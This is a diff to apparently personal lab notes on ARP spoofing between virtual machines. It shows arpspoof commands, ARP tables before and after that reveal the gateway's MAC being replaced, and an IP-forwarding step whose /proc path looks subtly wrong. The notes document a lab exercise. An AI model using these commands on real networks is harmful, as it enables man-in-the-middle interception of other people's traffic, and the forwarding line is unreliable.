@@ -18,13 +18,51 @@ arpspoof -i [Interface] -t [Gateway IP] [Target IP]
  
 For ex:
 
-arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
+Before Implementing arpspoof
+------------------------------------------------------------------
+Interface: 10.0.2.5 --- 0x5
+  Internet Address      Physical Address      Type
+  10.0.2.1              52-54-00-12-35-00     dynamic
+  10.0.2.4              08-00-27-89-03-db     dynamic
+  10.0.2.255            ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+--------------------------------------------------------------------
+Applying ArpSpoof  
+--------------------------------------------------------------------
+10.0.2.5 ==> Target's Ip
+10.0.2.1 ==> Gateway IP
 
-arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
+arpspoof -i eth0 -t 10.0.2.5 10.0.2.1
 
+arpspoof -i eth0 -t 10.0.2.1 10.0.2.5
+---------------------------------------------------------------------
+After Implementing ARPSpoof
+---------------------------------------------------------------------
+Interface: 10.0.2.5 --- 0x5
+  Internet Address      Physical Address      Type
+  10.0.2.1              08-00-27-89-03-db     dynamic
+  10.0.2.3              08-00-27-fc-93-05     dynamic
+  10.0.2.4              08-00-27-89-03-db     dynamic
+  10.0.2.255            ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+-----------------------------------------------------------------------
+Note that Physical Address/Mac Address has changed after that spoof
+
+10.0.2.1              52-54-00-12-35-00     dynamic
+10.0.2.1              08-00-27-89-03-db     dynamic
 
 To set the port Forwarding:-
 echo 1 > /proc/sys/ipv4/ip_forward
 ===============================================
+  
+Problem := Though everything went fine but after arpspoof the Mac add of the default gateway was not changing
+solution := It went fine when i gave all the VMs the same Nat Network and arpspoof was working.
 
-conclusion:= Though everything went fine but after arpspoof the Mac add of the default gateway was not changing
